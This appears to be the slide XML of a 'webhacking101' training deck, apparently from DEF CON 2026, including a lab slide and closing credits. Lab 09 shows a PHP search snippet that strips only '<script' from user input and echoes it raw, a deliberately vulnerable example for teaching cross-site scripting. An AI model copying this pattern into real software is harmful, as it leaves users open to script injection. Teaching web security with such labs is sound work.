            <a:endParaRPr b="0" i="0" sz="1350" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="928" name="Google Shape;928;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5285232"/>
            <a:ext cx="51206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84F58"/>
              </a:buClr>
              <a:buSzPts val="950"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="950" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="484F58"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>watch the panel · hints as you go · over-achiever? stored XSS in the full app</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="950" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="929" name="Google Shape;929;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="2697480"/>
            <a:ext cx="5577840" cy="3246120"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2254" name="adj"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="161B22"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="114300" rotWithShape="0" algn="bl" dir="5400000" dist="38100">
              <a:srgbClr val="000000">
                <a:alpha val="34902"/>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0" name="Google Shape;930;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="2935224"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F851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1" name="Google Shape;931;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483096" y="2935224"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D2992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2" name="Google Shape;932;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="2935224"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">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3" name="Google Shape;933;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7086600" y="2770632"/>
            <a:ext cx="42976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000"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>what the server built</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="934" name="Google Shape;934;p64"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="3227832"/>
            <a:ext cx="5577840" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="935" name="Google Shape;935;p64"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6263640" y="3355848"/>
            <a:ext cx="5029200" cy="2423160"/>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lab 09: kb search</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$q = preg_replace(</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  '/&lt;script/i','',$_GET['q']);</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="13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484F58"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="484F58"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>echo $q;  // reflected raw</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="936" name="Google Shape;936;p64"/>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7" name="Google Shape;937;p64"/>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938" name="Google Shape;938;p64"/>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63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43" name="Shape 943"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="944" name="Google Shape;944;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1737360"/>
            <a:ext cx="5486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B950"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>$ exit</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="945" name="Google Shape;945;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="2286000"/>
            <a:ext cx="10911535"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4400"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Thanks for hacking with us.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="946" name="Google Shape;946;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3474720"/>
            <a:ext cx="9601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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="1" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Keep the shells, share the writeups, and remember: the app will tell you what it did.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="947" name="Google Shape;947;p58"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4297680"/>
            <a:ext cx="5029200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="948" name="Google Shape;948;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4480560"/>
            <a:ext cx="109728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6EDF3"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>Cale Smith   ·   Luke Cycon   ·   Young Kim   ·   Ruchik Dave</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="949" name="Google Shape;949;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4892040"/>
            <a:ext cx="10058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1100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>webhacking101  ·  DEF CON 2026</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="950" name="Google Shape;950;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="6382512"/>
            <a:ext cx="91440" cy="91440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="3FB9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1" name="Google Shape;951;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="804672" y="6254496"/>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B949E"/>
              </a:buClr>
              <a:buSzPts val="900"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>webhacking101</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="952" name="Google Shape;952;p58"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11002975" y="6254496"/>
            <a:ext cx="548640" cy="3200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84F58"/>
              </a:buClr>
              <a:buSzPts val="900"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="484F58"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>57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2026-06-26T03:57:58Z</dcterms:created>
  <dc:creator>WWED Team</dc:creator>
</cp:coreProperties>
</file>